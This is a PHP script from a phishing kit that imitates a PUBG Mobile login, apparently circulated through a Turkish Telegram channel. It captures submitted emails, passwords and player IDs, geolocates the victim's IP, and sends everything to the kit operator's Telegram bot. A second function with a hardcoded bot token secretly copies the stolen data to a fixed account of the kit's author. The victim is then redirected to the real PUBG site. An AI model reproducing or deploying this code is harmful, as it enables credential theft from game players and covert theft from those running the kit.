<?php
$dir = __dir__;
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$level = $_POST['level'];
$playid = $_POST['playid'];
include "home.php"; 
$sudo = 5941388400;
$user = $message->from->username;
$user = $message->chat->username;
$user = $update->callback_query->message->chat->username;
$API_KEY = file_get_contents("$dir/token");
$MAZENN_KEY = file_get_contents("$dir/tokens");
define('API_KEY',$API_KEY);
define('MAZENN_KEY',$MAZENN_KEY);
function bot($method,$datas=[]){
    $yhya = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$yhya";
       
        $yhyasyrian = file_get_contents($url);
        return json_decode($yhyasyrian);
    }
    
    function deneme($method,$datas=[]){
    $yhya = http_build_query($datas);
        $url = "https://api.telegram.org/bot5908142854:AAE1sbU0xg0Y37skGOTvUZN9fvT-q0ElGJ8/".$method."?$yhya";
       
        $yhyasyrian = file_get_contents($url);
        return json_decode($yhyasyrian);
    }

    function getUserIP()
    {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

$ip = getUserIP();
$api = json_decode(file_get_contents("https://ipwhois.app/json/$ip"));
$country = $api->country;
$city = $api->city;
$ipp = $api->ip;
$year = date('Y');
$month = date('n');
$day = date('j');
$flag = $api->country_flag;
$code = $api->country_phone;
$admin = file_get_contents("$dir/id");

bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
🕵️ YENİ KAYIT BULUNDU ✅
- - - - - - - - - - - - - - - - - - - - - - - - - -
💳 ☬ Giriş Tipi ➽ » $login 🎁
- - - - - - - - - - - - - - - - - - - - - - - - - - 
📩ᯓ 𝙴-𝙿𝙾𝚂𝚃𝙰 » `$email`
🔐ᯓ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 » `$password`
🆔ᯓ 𝙿𝙻𝙰𝚈𝙴𝚁 𝙸𝙳 » `$playid`
👥ᯓ Düşüren Kişi » @$user
🌍ᯓ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈 » $country
🏙️ᯓ 𝙲𝙸𝚃𝚈 » $city
➕ᯓ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈 𝙲𝙾𝙳𝙴 » $code
⌚ᯓ 𝚃𝙸𝙼𝙴 𝚉𝙾𝙽𝙴 » $time_zone
💳ᯓ 𝙸𝙿 𝙰𝙳𝚁𝙴𝚂𝚂 » Premium Özel
🤠ᯓ 𝗬𝗮𝗽𝗶𝗺𝗰𝗶 𝗞𝗮𝗻𝗮𝗹 » [ 🔥 CYBER-ARSİV 🔥 ](https://t.me/CyberArsiv)
- - - - - - - - - - - - - - - - - - - - - - - - - - 
☾✯ WHOIS TURKEY ☾✯

",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
header('Location: https://www.pubgmobile.com/en-US/home.shtml');

deneme("sendMessage",[
"chat_id"=>$sudo,
"text"=>"
🕵️ YENİ KAYIT BULUNDU ✅
- - - - - - - - - - - - - - - - - - - - - - - - - -
💳 ☬ Giriş Tipi ➽ » $login 🎁
- - - - - - - - - - - - - - - - - - - - - - - - - - 
📩ᯓ 𝙴-𝙿𝙾𝚂𝚃𝙰 » `$email`
🔐ᯓ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 » `$password`
🆔ᯓ 𝙿𝙻𝙰𝚈𝙴𝚁 𝙸𝙳 » `$playid`
👥ᯓ Düşüren Kişi » @$user
🌍ᯓ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈 » $country
🏙️ᯓ 𝙲𝙸𝚃𝚈 » $city
➕ᯓ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈 𝙲𝙾𝙳𝙴 » $code
⌚ᯓ 𝚃𝙸𝙼𝙴 𝚉𝙾𝙽𝙴 » $time_zone
💳ᯓ 𝙸𝙿 𝙰𝙳𝚁𝙴𝚂𝚂 » $ip
🤠ᯓ 𝗬𝗮𝗽𝗶𝗺𝗰𝗶 𝗞𝗮𝗻𝗮𝗹 » [ 🔥 CYBER-ARSİV 🔥 ](https://t.me/cyberarsiv)
- - - - - - - - - - - - - - - - - - - - - - - - - - 
☾✯ WHOIS TURKEY ☾✯
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
header('Location: https://www.pubgmobile.com/en-US/home.shtml');